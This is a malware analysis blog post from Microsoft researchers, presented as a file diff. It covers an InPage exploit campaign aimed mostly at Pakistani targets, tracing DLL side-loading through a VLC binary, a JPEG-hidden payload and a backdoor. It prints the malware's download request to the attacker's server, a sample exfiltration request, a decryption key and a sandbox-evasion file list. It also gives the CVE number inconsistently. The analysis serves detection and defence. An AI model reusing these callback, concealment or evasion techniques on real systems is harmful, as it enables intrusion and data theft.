@@ -1,0 +1,110 @@
+
+		Our analysis of a targeted attack that used a language-specific word processor shows why it’s important to understand and protect against small-scale and localized attacks as well as broad-scale malware campaigns. The attack exploited a vulnerability in InPage, a word processor software for specific languages like Urdu, Persian, Pashto, and Arabic.
+More than 75% of the targets were located in Pakistan; however, the attack also found its way into some countries in Europe and the US. The targets included government institutions.
+Figure 1. Geographic distribution of targets
+In the past, researchers at Palo Alto and Kaspersky have blogged about attacks that use malicious InPage documents. Beyond that, public research of these types of attacks has been limited.
+The Office 365 Research and Response team discovered this type of targeted attack in June. The attack was orchestrated using the following approach:
+
+Spear-phishing email with a malicious InPage document with the file name hafeez saeed speech on 22nd April.inp was sent to the intended victims
+The malicious document, which contained exploit code for CVE-2017-12824, a buffer-overflow vulnerability in InPage, dropped a legitimate but outdated version of VLC media player that is vulnerable to DLL hijacking
+The side-loaded malicious DLL called back to a command-and-control (C&C) site, which triggered the download and execution of the final malware encoded in a JPEG file format
+The final malware allowed attackers to remotely execute arbitrary command on the compromised machine
+
+
+Figure 2. Attack infection chain
+Office 365 Advanced Threat Protection (ATP) protects customers from this attack by detecting the malicious InPage attachment in spear-phishing emails used in the campaign. Office 365 ATP inspects email attachments and links for malicious content and provides real-time protection against attacks.
+Office 365 ATP leverages massive threat intelligence from different data sources and integrates signals from multiple services such as Windows Defender ATP and Azure ATP. For example, Windows Defender Antivirus detects the malicious files and documents used in this attack. Additionally, endpoint detection and response (EDR) capabilities in Windows Defender ATP detects the DLL side-loading and malicious behavior observed in this attack. Through the integration of Office 365 ATP and the rest of Microsoft security technologies in Microsoft Threat Protection, detection and remediation are orchestrated across our solutions.
+Entry point: Malicious InPage document
+An email with a malicious InPage lure document attached was sent to select targets. The document exploits CVE-2017-12842, a vulnerability in InPage that allows arbitrary code execution. When the malicious InPage document is opened, it executes a shellcode that decrypts and executes an embedded malicious DLL file. The decryption routine is a simple XOR function that uses the decryption key “27729984h”.
+Figure 3. First DLL decryption function
+Stage 1: DLL side-loading and C&C communication
+The decrypted malicious DLL contains two files embedded in the PE resources section. The first resource file is named 200, which is a legitimate version of VLC media player (Product Version: 2.2.1.0, File Version: 2.2.1). The second file in the resources section is named 400, which is a DLL hijacker that impersonates the legitimate file Libvlc.dll.
+When run, the stage 1 malware drops both the VLC media player executable and the malicious Libvlc.dll in %TEMP% folder, and then runs the VLC media player process.
+The vulnerable VLC media player process searches for the dropped file Libvlc.dll in the directory from which it was loaded. It subsequently picks up and loads the malicious DLL and executes its malicious function.
+Figure 4. Functions exported by the malicious Libvlc.dllFigure 5. Functions imported from Libvlc.dll by the VLC media player process
+The most interesting malicious code in Libvlc.dll is in the function libvlc_wait(). The malicious code dynamically resolves the API calls to connect to the attacker C&C server and download a JPEG file. If the C&C server is not reachable, the malware calls the API sleep() for five seconds and attempts to call back the attacker domain again.
+Figure 6. C&C callback in malicious function libvlc_wait()
+If the JPEG file logo.jpg is successfully downloaded, the malicious code in libvlc_wait() skips the first 20 bytes of the JPEG file and creates a thread to execute the embedded payload. The code in JPEG file is encoded using Shikata ga nai, a custom polymorphic shellcode encoder/decoder.
+Below an example of HTTP request sent to the C&C to download the malicious file logo.jpg.
+GET /assets/vnc/logo.jpg HTTP/1.1
+Accept: */*
+Host: useraccount.co
+
+HTTP/1.1 200 OK
+Date: Mon, 09 Jul 2018 13:45:49 GMT
+Server: Apache/2.4.33 (cPanel) OpenSSL/1.0.2o mod_bwlimited/1.4 Phusion_Passenger/5.1.12
+Upgrade: h2,h2c
+Connection: Upgrade
+Last-Modified: Mon, 09 Apr 2018 07:19:20 GMT
+ETag: "26e0378-2086b-56965397b5c31"
+Accept-Ranges: bytes
+Content-Length: 133227
+Content-Type: image/jpeg
+Figure 7. HTTP GET Request embedded in the JPEG File
+The historical Whois record indicated that the C&C server was registered on March 20, 2018.
+Domain Name: useraccount.co
+Registry Domain ID: D2169366F46A14BCD9EB42AF48BEA813C-NSR
+Registrar WHOIS Server:
+Registrar URL: whois.publicdomainregistry.com
+Updated Date: 2018-03-20T14:04:40Z
+Creation Date: 2018-03-20T14:04:40Z
+Registry Expiry Date: 2019-03-20T14:04:40Z
+Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
+Domain Status: addPeriod https://icann.org/epp#addPeriod
+Figure 8. Whois record for the attacker C&C server.
+The shellcode in the JPEG file uses multiple layers of polymorphic XOR routines to decrypt the final payload. After successfully decrypting the payload, it drops and executes the final DLL malware aflup64.dll in the folder %ProgramData%\Dell64.
+
+Figure 9. The first 29 Bytes of the JPEG file after the header make up the first decryption layer
+Figure 10. Valid JPEG file header followed by encrypted malicious code
+Stage 2: System reconnaissance and executing attacker commands
+The final stage malware maintains persistence using different methods. For example, the malicious function IntRun() can load and execute the malware DLL. It also uses the registry key CurrentVersion\Run to maintain persistence.
+The malware’s capabilities include:
+
+System reconnaissance
+
+List computer names, Windows version, Machine ID, running processes, and loaded modules
+List system files and directories
+List network configuration
+
+
+Execute attacker commands
+Evade certain sandboxes or antivirus products
+
+Collected information or responses to commands are sent back to the attacker domain via an HTTP post request. The request has a custom header that always starts with 37 hardcoded alphanumeric characters.
+---------------------n9mc4jh3ft7327hfg78kb41b861ft18bhfb91
+Content-Disposition: form-data; name="id";
+Content-Type: text/plain
+<Base64 Data Blob>
+Figure 11. Sample of malware POST request
+The malware also has a list of hardcoded file names of security products and sandbox solutions. If these files are present in a machine the malware attempts to infect, it exits:
+
+avgnt.exe
+avp.exe
+egui.exe
+Sbie.dll
+VxKernelSvcNT.log
+
+Detecting targeted attacks with Office 365 ATP and Windows Defender ATP
+Historically, malware payloads like the stage 2 malware in this attack are used to steal credentials and other sensitive information, install more payloads, or move laterally in the network. However, because the malware opens a backdoor channel for remote attackers to execute arbitrary commands of their choice, there’s a wide range of possibilities.
+Enterprises can protect themselves from targeted attacks using Office 365 Advanced Threat Protection, which blocks threats based on the detection of malicious behaviors. Office 365 ATP helps secure mailboxes against email attacks by blocking emails with unsafe attachments, malicious links, and linked-to files leveraging sandboxing and time-of-click protection. Recent enhancements in anti-phishing capabilities in Office 365 address impersonation, spoof, phishing content, and internal phishing emails sent from compromised accounts. If you are not already secured against advanced cyberthreat campaigns via email, begin a free Office 365 E5 trial today.
+In addition, enterprises can use Windows Defender Advanced Threat Protection, which provides a unified endpoint security platform for intelligent protection, detection, investigation, and response. Exploit protection, attack surface reduction rules, hardware-based isolation, controlled folder access, and network protection reduce the attack surface. Windows Defender Antivirus detects and blocks the malicious documents and files used in this campaign. Windows Defender ATP’s endpoint detection and response, automated investigation and remediation, and advanced hunting capabilities empower security operations personnel to detect and stop attacks in enterprise networks. To test how Windows Defender ATP can help your organization detect, investigate, and respond to advanced attacks, sign up for a free Windows Defender ATP trial.
+These two services integrate with the rest of Microsoft’s security technologies as part of the Microsoft Threat Protection, an integrated solution providing security for the modern workplace across identities, endpoints, user data, cloud apps, and infrastructure. Cybersecurity is the central challenge of our digital age, and Microsoft doesn’t stop innovating to provide industry-best integrated security. For more information, read the blog post Delivering security innovation that puts Microsoft’s experience to work for you.
+ 
+ 
+ 
+Ahmed Shosha and Abhijeet Hatekar
+Microsoft Threat Intelligence Center
+ 
+ 
+ 
+Indictors of Compromise (IoCs)
+URLs
+hxxp://useraccount[.]co/assets/vnc/logo[.]jpg
+hxxp://useraccount[.]co/assets/vnc/rest[.]php
+hxxp://useraccount[.]co/assets/kvx/success[.]txt
+hxxp://useraccount[.]co/assets/pqs/rest[.]php
+Files (SHA-256)
+013417bd5465d6362cd43c70015c7a74a1b8979785b842b7cfa543cb85985852 (INP File)
+9ffb61f1360595fc707053620f3751cb76c83e67835a915ccd3cbff13cf97bed (EXE)
+019b8a0d3f9c9c07103f82599294688b927fbbbdec7f55d853106e52cf492c2b (DLL)
+	
